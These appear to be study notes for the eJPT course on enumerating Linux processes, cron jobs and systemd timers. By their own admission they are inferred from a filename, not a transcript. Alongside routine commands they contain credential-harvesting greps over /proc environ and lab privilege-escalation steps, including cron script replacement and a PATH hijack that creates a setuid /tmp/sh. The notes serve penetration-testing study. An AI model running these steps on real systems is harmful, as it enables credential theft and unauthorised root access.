# Enumerating Processes & Cron Jobs (eJPT) â€” Study Notes

Note: No transcript was provided. The following is inferred conservatively from the filename and typical eJPT Linux Local Enumeration content. Commands are practical and copy-paste ready. Use only in authorized labs.

## What the video covers (Introduction / big picture)
- How to enumerate running processes and scheduled tasks (cron/systemd timers) during Linux local enumeration.
- Why it matters:
  - Find privilege escalation paths (root-owned scripts, writable cron jobs, PATH hijacks).
  - Capture credentials/secrets from process arguments or environments.
  - Map services, network bindings, and persistence mechanisms.
  - Validate misconfigurations and logs.

## Flow (ordered)
1. Identify init system and context (systemd vs SysV, user/privileges).
2. Process triage: list running processes, focus on root-owned and unusual paths (e.g., /tmp, /home).
3. Deep-dive suspicious processes via /proc (cmdline, environ, open files, cwd).
4. Network-linked processes: map ports to PIDs and binaries.
5. Services: enumerate systemd services or SysV init scripts.
6. Cron enumeration: user crontab, root/system crontabs, cron directories, anacron, spool.
7. Systemd timers: list and inspect timers and associated services.
8. Permissions/misconfig checks: writable scripts/dirs executed by root; PATH misuse; wildcard issues.
9. Logs: cron logs and service journals for clues/errors.
10. Decide exploitation paths (if authorized): replace writable scripts, PATH hijacks, weak commands in root scripts.

## Tools highlighted
- Process listing: ps, pgrep, pstree, top/htop (if present).
- Proc inspection: /proc/PID/{cmdline,environ,cwd,exe,fd}, lsof -p.
- Network: ss, lsof -i, netstat (legacy).
- Services: systemctl, service, cat unit files.
- Cron: crontab, /etc/crontab, /etc/cron.{hourly,daily,weekly,monthly}, /etc/cron.d, anacron, run-parts.
- Timers: systemctl list-timers, journalctl.
- Search and perms: grep, strings, find, stat.
- Logs: journalctl, /var/log/syslog, /var/log/cron, /var/log/messages.

## Typical command walkthrough (detailed, copy-paste friendly)

Baseline and environment
```
whoami
id
hostnamectl 2>/dev/null || uname -a
ps -p 1 -o comm=
```

Quick process triage
```
# Full process tree with long args
ps auxwwf

# Easy-to-read custom view
ps -eo pid,ppid,user,group,tty,stime,etime,%cpu,%mem,cmd --forest

# Root-owned processes (scan for odd paths)
ps -eo pid,user,cmd | awk '$2=="root"{print}' | grep -E "(/tmp/|/home/|/dev/shm/)"

# Grep for common tools that may reveal creds
pgrep -a -f "ssh|scp|mysql|psql|pg_dump|mongod|redis|python|perl|ruby|php|nc|ncat|socat|java|jenkins|ansible|salt|backup|rsync"
```

Deep dive a process (replace $PID)
```
PID=1234
echo "[*] PID $PID details"
readlink -f /proc/$PID/exe 2>/dev/null
tr '\0' ' ' < /proc/$PID/cmdline 2>/dev/null; echo
strings -a /proc/$PID/environ 2>/dev/null | egrep -i "pass|secret|key|token|aws_|sess|cookie"
ls -l /proc/$PID/cwd 2>/dev/null
lsof -p $PID 2>/dev/null | head -n 50
```

Hunt secrets in process environments (quick scan)
```
for f in /proc/[0-9]*/environ; do
  strings -a "$f" 2>/dev/null | egrep -i "pass|secret|key|token|cookie|aws_" && echo "-> $f"
done
```

Network-bound processes
```
ss -tulpn
lsof -i -nP | grep -E "LISTEN|ESTABLISHED"
```

Systemd services (if systemd)
```
systemctl is-system-running 2>/dev/null
systemctl list-units --type=service --state=running
# Inspect a suspicious service
SVC=apache2.service
systemctl status "$SVC"
systemctl cat "$SVC"
# Show unit file path and ExecStart
systemctl show -p FragmentPath,ExecStart "$SVC"
```

SysV services (if not systemd)
```
service --status-all 2>/dev/null
ls -la /etc/init.d/
```

Cron enumeration (user, root, system)
```
# Current user crontab
crontab -l 2>/dev/null

# Try root crontab (if sudo or root)
sudo -n crontab -l 2>/dev/null || echo "No sudo or not allowed"

# System crontab and directories
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ 2>/dev/null
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null
cat /etc/anacrontab 2>/dev/null
```

Cron spool (may be restricted)
```
ls -la /var/spool/cron 2>/dev/null
ls -la /var/spool/cron/crontabs 2>/dev/null  # Debian/Ubuntu
```

Identify cron misconfigurations
```
# Any writable cron files or scripts?
find /etc/cron* /var/spool/cron* -type f -writable -ls 2>/dev/null

# Extract non-commented entries
grep -R --line-number -E '^[^#]+' /etc/crontab /etc/cron.d/ 2>/dev/null

# Check targets referenced by cron for weak perms
# Example: if /etc/crontab executes /usr/local/bin/backup.sh, check:
TARGET=/usr/local/bin/backup.sh
stat -c '%A %U:%G %n' "$TARGET" 2>/dev/null
ls -ld "$(dirname "$TARGET")" 2>/dev/null
```

Cron PATH and shell
```
# Cron's shell and PATH (often /bin/sh, minimal PATH)
grep -E '^(SHELL|PATH)' /etc/crontab 2>/dev/null
```

Systemd timers
```
systemctl list-timers --all
# Inspect a timer and its service
TIMER=someservice.timer
systemctl status "$TIMER"
systemctl cat "$TIMER"
SVC=$(systemctl show -p Unit "$TIMER" | cut -d= -f2)
systemctl cat "$SVC"
```

Logs for cron/timers
```
# Syslog-based cron (Debian/Ubuntu common)
grep -i cron /var/log/syslog 2>/dev/null | tail -n 100
# RHEL/CentOS
grep -i cron /var/log/cron 2>/dev/null | tail -n 100
grep -i cron /var/log/messages 2>/dev/null | tail -n 100

# systemd journals
journalctl -t CRON -n 100 2>/dev/null
journalctl -u cron -n 100 2>/dev/null
journalctl --since "1 hour ago" | grep -i cron 2>/dev/null

# Specific timer/service logs
journalctl -u someservice.timer -u someservice.service -n 100 2>/dev/null
```

Common exploitation patterns to test (authorized labs only)
```
# 1) Writable root-executed cron script replacement (example)
# Suppose /etc/crontab runs root: /usr/local/bin/backup.sh
TARGET=/usr/local/bin/backup.sh
stat "$TARGET"
# If writable by you, replace with a payload that gives you root control (lab-safe example: write to /tmp)
printf '#!/bin/sh\nid > /tmp/cron_ran_as_root\nwhoami >> /tmp/cron_ran_as_root\n' > "$TARGET"
chmod +x "$TARGET"

# 2) PATH hijack (if root script uses unqualified binary, and a writable dir is ahead in PATH)
# Find PATH in the script and whether directories are writable
SCRIPT=/usr/local/bin/backup.sh
grep -n 'PATH=' "$SCRIPT"
echo "$PATH"
find $(echo "$PATH" | tr ':' ' ') -maxdepth 1 -type d -writable 2>/dev/null

# If /tmp is in PATH before /bin and script calls 'tar' without full path:
echo -e '#!/bin/sh\n/bin/sh -c "id > /tmp/pwn && cp /bin/sh /tmp/sh && chmod +s /tmp/sh"' > /tmp/tar
chmod +x /tmp/tar
# Wait for cron to invoke the script

# 3) Wildcard injection in cron scripts (tar, chown, chmod with *)
# If a root script runs: tar czf backup.tgz *  (and runs in a directory you control)
# Create exploit files for known tar CVE patterns (lab scenario)
```

Cleanup (responsible testing)
```
# Remove artifacts
rm -f /tmp/cron_ran_as_root /tmp/pwn /tmp/tar /tmp/sh /tmp/rootshell 2>/dev/null
```

## Practical tips
- Prefer ps auxwwf and systemctl list-units for a quick, readable overview.
- Secrets often hide in:
  - Process arguments (ps auxww shows full args).
  - /proc/PID/environ (API keys, DB credentials).
  - Working directories of services (/proc/PID/cwd).
- Prioritize root-owned processes/scripts whose paths live under writable directories like /usr/local/, /opt/, /var/www/, shared NFS mounts, or user home directories.
- For cron:
  - Check /etc/crontab, /etc/cron.d/*, and /etc/cron.{hourly,daily,weekly,monthly} for custom jobs.
  - Cron runs with a minimal environment (SHELL=/bin/sh, minimal PATH). Scripts must use absolute paths to be safe; if not, look for PATH hijacks.
  - Validate permissions on both the file and its parent directories (writable dirs enable replacement).
  - Review logs to confirm whether jobs actually execute (and when).
- For systemd timers:
  - Every .timer triggers a .service; inspect ExecStart in the service unit and file permissions.
- Use strings/grep conservatively on /proc to avoid noise; target likely processes first (DB, web servers, backup agents).
- Always document exact findings: job line, file path, owner, perms, timer schedule, and exploitation hypothesis.

## Minimal cheat sheet (one-screen flow)
```
# Init/system
whoami; id; ps -p 1 -o comm=

# Processes
ps auxwwf
ps -eo pid,user,cmd | awk '$2=="root"{print}' | grep -E "(/tmp/|/home/|/dev/shm/)"
pgrep -a -f "mysql|psql|ssh|python|php|java|backup|rsync"

# Proc inspect (set PID)
PID=1234; tr '\0' ' ' < /proc/$PID/cmdline; strings -a /proc/$PID/environ | egrep -i "pass|key|token"; lsof -p $PID | head

# Network
ss -tulpn; lsof -i -nP | grep LISTEN

# Services
systemctl list-units --type=service --state=running
SVC=nginx.service; systemctl cat "$SVC"; systemctl show -p FragmentPath,ExecStart "$SVC"

# Cron (user + system)
crontab -l 2>/dev/null
sudo -n crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null
cat /etc/anacrontab 2>/dev/null
grep -E '^(SHELL|PATH)' /etc/crontab 2>/dev/null

# Timers
systemctl list-timers --all

# Misconfig checks
find /etc/cron* /var/spool/cron* -type f -writable -ls 2>/dev/null
grep -R --line-number '^[^#]+' /etc/crontab /etc/cron.d/ 2>/dev/null

# Logs
grep -i cron /var/log/syslog 2>/dev/null | tail
journalctl -t CRON -n 50 2>/dev/null
```

## Summary
- Enumerating processes and cron jobs is core to Linux local enumeration: it reveals live services, secrets, and scheduled tasks that can be leveraged for privilege escalation or persistence.
- Start with broad process views, then pivot into /proc for details and secrets. Map network listeners to services.
- Enumerate both classic cron and systemd timers. Read all crontab sources, inspect ExecStart targets, and verify permissions on scripts and their directories.
- Focus on misconfigurations: writable root-executed scripts, missing absolute paths, unsafe wildcards, and weak PATHs. Confirm behavior via logs.
- Keep notes on exact paths, owners, permissions, and schedules to justify any exploitation steps in a lab and to aid reporting.